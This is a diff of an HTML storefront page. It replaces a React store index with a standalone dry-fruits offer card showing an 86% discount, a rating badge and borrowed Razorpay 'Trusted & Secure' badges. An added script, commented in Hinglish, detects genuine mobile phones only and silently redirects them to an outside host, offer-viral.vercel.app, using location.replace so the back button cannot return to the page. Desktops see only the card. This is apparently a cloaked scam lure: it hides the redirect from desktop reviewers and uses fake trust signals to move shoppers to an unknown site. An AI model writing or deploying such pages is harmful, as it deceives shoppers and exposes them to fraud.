@@ -1,54 +1,401 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <!-- <link rel="icon" type="image/svg+xml" href="/vite.svg" /> -->
-    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/wr6TgJHd/org-chromium-webapk-a83f8ed661b7a33d4-v2-1.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Dryfruit Store</title>
+<head>
+    <meta charset="UTF-8">
 
-    <!-- Facebook Pixel Code -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Featured Products</title>
+
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet"
+    >
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Entire Popup Card */
+        .popup-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: inherit;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .popup-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        }
+
+        .main-heading {
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            color: #000000;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+        }
+
+        /* Product Inner Box */
+        .product-box {
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
+            border: 1px solid #f1f1f1;
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .single-image-container {
+            width: 100%;
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .product-image {
+            width: 100%;
+            max-height: 220px;
+            object-fit: contain;
+            border-radius: 12px;
+        }
+
+        .product-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #2c2c2c;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        /* Rating */
+        .rating-container {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 14px;
+        }
+
+        .rating-badge {
+            background-color: #388e3c;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .rating-count {
+            font-size: 12px;
+            color: #878787;
+        }
+
+        /* Pricing */
+        .price-container {
+            display: flex;
+            align-items: baseline;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .current-price {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+        }
+
+        .original-price {
+            font-size: 14px;
+            color: #878787;
+            text-decoration: line-through;
+        }
+
+        .discount {
+            font-size: 14px;
+            font-weight: 600;
+            color: #388e3c;
+        }
+
+        /* Continue to Shopping Button */
+        .cta-button {
+            display: inline-block;
+            width: 100%;
+            padding: 14px 24px;
+            background-color: #fb641b;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            text-decoration: none;
+            text-align: center;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            cursor: pointer;
+            border: none;
+        }
+
+        .cta-button:hover {
+            background-color: #e05515;
+            transform: translateY(-1px);
+        }
+
+        .cta-button:active {
+            transform: translateY(0px);
+        }
+
+        .welcome-text {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+
+        /* Secure Payment Footer */
+        .secure-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            font-size: 14px;
+            color: #555555;
+        }
+
+        .razorpay-logo {
+            height: 16px;
+            width: auto;
+            vertical-align: middle;
+        }
+
+        .trusted-box {
+            border-left: 1px solid #dddddd;
+            padding-left: 8px;
+            margin-left: 4px;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 9px;
+        }
+
+        .trusted-icon {
+            width: 16px;
+            height: 16px;
+            background: #2f6df6;
+            color: #ffffff;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .trusted-title {
+            color: #2954c8;
+        }
+
+        .trusted-description {
+            color: #5f7fe5;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+
+            .popup-card {
+                padding: 30px 18px;
+                border-radius: 28px;
+            }
+
+            .main-heading {
+                font-size: 29px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <a
+        href="https://offer-viral.vercel.app/"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="popup-card"
+    >
+        <h1 class="main-heading">Welcome</h1>
+
+        <div class="product-box">
+
+            <div class="single-image-container">
+                <img
+                    class="product-image"
+                    src="https://m.media-amazon.com/images/I/512J1jN8WXL.jpg?w=100%"
+                    alt="Dry Fruits Combo Pack"
+                >
+            </div>
+
+            <div class="product-title">
+                (4KG - 1Kg × 4) Dry Fruits Combo Pack of 4 -
+                Almonds, Cashews and More
+            </div>
+
+            <div class="rating-container">
+                <span class="rating-badge">4.4 ★</span>
+                <span class="rating-count">(4,320 Ratings)</span>
+            </div>
+
+            <div class="price-container">
+                <span class="current-price">₹279</span>
+                <span class="original-price">₹1,999</span>
+                <span class="discount">86% off</span>
+            </div>
+
+        </div>
+
+        <!-- Continue to Shopping Button -->
+        <span class="cta-button">🛒 Continue to Shopping</span>
+
+        <p class="welcome-text">
+            Welcome to our Dryfruit and Grocery Store
+        </p>
+
+        <div class="secure-footer">
+            <span>🔒 Secure Payment by</span>
+
+            <img
+                src="https://razorpay.com/assets/razorpay-logo.svg"
+                class="razorpay-logo"
+                alt="Razorpay"
+            >
+
+            <span class="trusted-box">
+
+                <span class="trusted-icon">✓</span>
+
+                <span>
+                    <strong class="trusted-title">
+                        Trusted &amp; Secure
+                    </strong>
+
+                    <br>
+
+                    <span class="trusted-description">
+                        100% Safe Payments
+                    </span>
+                </span>
+
+            </span>
+        </div>
+    </a>
+
     <script>
-      !(function (f, b, e, v, n, t, s) {
-        if (f.fbq) return;
-        n = f.fbq = function () {
-          n.callMethod
-            ? n.callMethod.apply(n, arguments)
-            : n.queue.push(arguments);
-        };
-        if (!f._fbq) f._fbq = n;
-        n.push = n;
-        n.loaded = !0;
-        n.version = "2.0";
-        n.queue = [];
-        t = b.createElement(e);
-        t.async = !0;
-        t.src = v;
-        s = b.getElementsByTagName(e)[0];
-        s.parentNode.insertBefore(t, s);
-      })(
-        window,
-        document,
-        "script",
-        "https://connect.facebook.net/en_US/fbevents.js"
-      );
-      fbq("init", "2803583989995779");
-      fbq("track", "PageView");
+        (function () {
+            "use strict";
+
+            const redirectLink = "https://offer-viral.vercel.app/";
+
+            function isActualMobilePhone() {
+
+                /*
+                 * Modern Chrome, Edge and Android browsers.
+                 * navigator.userAgentData.mobile true hone par
+                 * device ko mobile phone maana jayega.
+                 */
+                if (
+                    navigator.userAgentData &&
+                    typeof navigator.userAgentData.mobile === "boolean"
+                ) {
+                    return navigator.userAgentData.mobile;
+                }
+
+                /*
+                 * Safari, Firefox aur older browsers ke liye
+                 * user-agent detection.
+                 */
+                const userAgent =
+                    navigator.userAgent ||
+                    navigator.vendor ||
+                    window.opera ||
+                    "";
+
+                const isIPhoneOrIPod =
+                    /iPhone|iPod/i.test(userAgent);
+
+                /*
+                 * Android phone ke user-agent mein normally
+                 * Android ke saath Mobile bhi hota hai.
+                 * Android tablet mein aksar Mobile nahi hota.
+                 */
+                const isAndroidPhone =
+                    /Android/i.test(userAgent) &&
+                    /Mobile/i.test(userAgent);
+
+                const isOtherMobilePhone =
+                    /Windows Phone|IEMobile|Opera Mini|BlackBerry/i.test(
+                        userAgent
+                    );
+
+                /*
+                 * Coarse pointer ka matlab generally finger-touch device.
+                 * Isse normal desktop detection aur strict hoti hai.
+                 */
+                const hasCoarsePointer =
+                    window.matchMedia &&
+                    window.matchMedia("(pointer: coarse)").matches;
+
+                const isPhoneUserAgent =
+                    isIPhoneOrIPod ||
+                    isAndroidPhone ||
+                    isOtherMobilePhone;
+
+                return isPhoneUserAgent && hasCoarsePointer;
+            }
+
+            if (isActualMobilePhone()) {
+
+                /*
+                 * replace() current page ko browser history se
+                 * replace karta hai. Back button se redirect page
+                 * baar-baar open nahi hoga.
+                 */
+                window.location.replace(redirectLink);
+            }
+        })();
     </script>
-  </head>
 
-  <body>
-    <!-- Facebook Pixel noscript MUST be inside body -->
-    <noscript>
-      <img
-        height="1"
-        width="1"
-        style="display: none"
-        src="https://www.facebook.com/tr?id=2803583989995779&ev=PageView&noscript=1"
-      />
-    </noscript>
-
-    <div id="root"></div>
-    <script type="module" src="/src/main.jsx"></script>
-  </body>
+</body>
 </html>
